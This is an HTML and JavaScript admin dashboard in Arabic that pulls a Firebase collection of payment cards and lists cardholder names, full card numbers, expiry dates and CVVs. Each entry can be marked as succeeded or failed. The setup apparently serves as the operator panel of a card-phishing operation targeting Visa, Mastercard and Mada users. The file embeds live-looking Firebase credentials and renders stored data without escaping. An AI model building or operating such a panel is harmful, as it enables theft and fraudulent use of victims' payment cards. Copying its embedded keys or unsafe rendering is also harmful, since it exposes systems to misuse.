<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة تحكم البطاقات المسجلة</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #1a56db;
            --bg: #f9fafb;
            --white: #ffffff;
            --border: #e5e7eb;
        }
        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg); margin: 0; padding: 20px; }
        .container { max-width: 1100px; margin: 0 auto; }
        
        /* Stats Section */
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: var(--white); padding: 20px; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); display: flex; align-items: center; gap: 15px; }
        .stat-card i { font-size: 24px; color: var(--primary); }
        .stat-val { font-size: 22px; font-weight: bold; display: block; }
        .stat-label { color: #6b7280; font-size: 14px; }

        /* Table Section */
        .table-container { background: var(--white); border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); padding: 20px; overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; text-align: right; }
        th { padding: 15px; border-bottom: 2px solid var(--border); color: #374151; }
        td { padding: 15px; border-bottom: 1px solid var(--border); }
        
        .badge { padding: 4px 10px; border-radius: 6px; font-size: 12px; font-weight: 600; }
        .badge-visa { background: #eef2ff; color: #4338ca; }
        .badge-master { background: #fff7ed; color: #9a3412; }
        .badge-mada { background: #f0fdf4; color: #166534; }
        
        .delete-btn { color: #ef4444; border: none; background: none; cursor: pointer; font-size: 18px; }
        .loader { text-align: center; padding: 40px; font-size: 18px; color: var(--primary); }
    </style>
</head>
<body>

<div class="container">
    <header style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px;">
        <h1><i class="fa-solid fa-database"></i> البطاقات المسجلة</h1>
        <button onclick="location.reload()" style="padding: 8px 16px; background: #fff; border: 1px solid var(--border); border-radius: 8px; cursor: pointer;">
            <i class="fa-solid fa-rotate"></i> تحديث
        </button>
    </header>

    <div class="stats-grid">
        <div class="stat-card"><i class="fa-solid fa-credit-card"></i><div><span class="stat-val" id="total-count">0</span><span class="stat-label">الإجمالي</span></div></div>
        <div class="stat-card"><i class="fa-brands fa-cc-visa"></i><div><span class="stat-val" id="visa-count">0</span><span class="stat-label">فيزا</span></div></div>
        <div class="stat-card"><i class="fa-brands fa-cc-mastercard"></i><div><span class="stat-val" id="master-count">0</span><span class="stat-label">ماستركارد</span></div></div>
        <div class="stat-card"><img src="m.png" width="25" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/8/84/Mada_Logo.svg'"><div><span class="stat-val" id="mada-count">0</span><span class="stat-label">مدى</span></div></div>
    </div>

    <div class="table-container">
        <div id="loading" class="loader"><i class="fas fa-spinner fa-spin"></i> جاري جلب البيانات من Firebase...</div>
        <table id="cards-table" style="display: none;">
            <thead>
                <tr>
                    <th>النوع</th>
                    <th>حامل البطاقة</th>
                    <th>رقم البطاقة</th>
                    <th>التاريخ</th>
                    <th>CVV</th>
                    <th>تاريخ التسجيل</th>
                    <th>الحالة</th>
                    <th>إجراء</th>
                </tr>
            </thead>
            <tbody id="table-body"></tbody>
        </table>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
    import { getFirestore, collection, getDocs, deleteDoc, doc, query, orderBy, updateDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyCdJXSbkjeQUxFeMD_HrXs1oKvmCcoqhDA",
        authDomain: "visa-4bbee.firebaseapp.com",
        projectId: "visa-4bbee",
        storageBucket: "visa-4bbee.firebasestorage.app",
        messagingSenderId: "478640798152",
        appId: "1:478640798152:web:b2f115b1989e7a174128fd",
        measurementId: "G-F7FS48709G"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    async function loadCards() {
        const tableBody = document.getElementById('table-body');
        const loading = document.getElementById('loading');
        const table = document.getElementById('cards-table');
        
        let stats = { total: 0, visa: 0, mastercard: 0, mada: 0 };

        try {
            // جلب البيانات مرتبة حسب التاريخ (الأحدث أولاً)
            const q = query(collection(db, "cards"), orderBy("createdAt", "desc"));
            const querySnapshot = await getDocs(q);
            
            tableBody.innerHTML = "";
            
            querySnapshot.forEach((docSnap) => {
                const data = docSnap.data();
                stats.total++;
                stats[data.cardType]++;

                const date = data.createdAt ? data.createdAt.toDate().toLocaleString('ar-EG') : 'غير متوفر';

                const row = `
                    <tr id="row-${docSnap.id}">
                        <td><span class="badge badge-${data.cardType}">${data.cardType.toUpperCase()}</span></td>
                        <td>${data.cardHolder}</td>
                        <td dir="ltr">${data.cardNumber}</td>
                        <td>${data.expiryDate}</td>
                        <td>${data.cvv}</td>
                        <td style="font-size: 12px; color: #666;">${date}</td>
                        <td id="status-${docSnap.id}">${data.status || 'قيد الانتظار'}</td>
                        <td>
                            <button onclick="updateStatus('${docSnap.id}', 'success')" style="color:green; border:none; background:none; cursor:pointer;"><i class="fa-solid fa-check"></i></button>
                            <button onclick="updateStatus('${docSnap.id}', 'error')" style="color:orange; border:none; background:none; cursor:pointer;"><i class="fa-solid fa-xmark"></i></button>
                            <button class="delete-btn" onclick="deleteCard('${docSnap.id}')"><i class="fa-solid fa-trash-can"></i></button>
                        </td>
                    </tr>
                `;
                tableBody.innerHTML += row;
            });

            // تحديث واجهة الإحصائيات
            document.getElementById('total-count').innerText = stats.total;
            document.getElementById('visa-count').innerText = stats.visa;
            document.getElementById('master-count').innerText = stats.mastercard;
            document.getElementById('mada-count').innerText = stats.mada;

            loading.style.display = 'none';
            table.style.display = 'table';

        } catch (error) {
            console.error("Error: ", error);
            loading.innerText = "فشل تحميل البيانات. تأكد من إعدادات Firestore.";
        } 
    }

    // وظيفة الحذف
    window.deleteCard = async (id) => {
        if (confirm("هل أنت متأكد من حذف هذه البطاقة؟")) {
            try {
                await deleteDoc(doc(db, "cards", id));
                document.getElementById(`row-${id}`).remove();
                alert("تم الحذف بنجاح");
                location.reload(); // لتحديث الإحصائيات
            } catch (error) {
                alert("خطأ في الحذف: " + error.message);
            }
        }
    };

    // وظيفة تحديث الحالة
    window.updateStatus = async (id, newStatus) => {
        try {
            await updateDoc(doc(db, "cards", id), { status: newStatus });
            const label = newStatus === 'success' ? 'ناجح' : (newStatus === 'error' ? 'فشل' : newStatus);
            const el = document.getElementById(`status-${id}`);
            if (el) el.innerText = label;
            alert("تم تحديث الحالة للمستخدم");
        } catch (e) {
            alert("خطأ في التحديث: " + (e.message || e));
        }
    };

    loadCards();
</script>
</body>
</html>
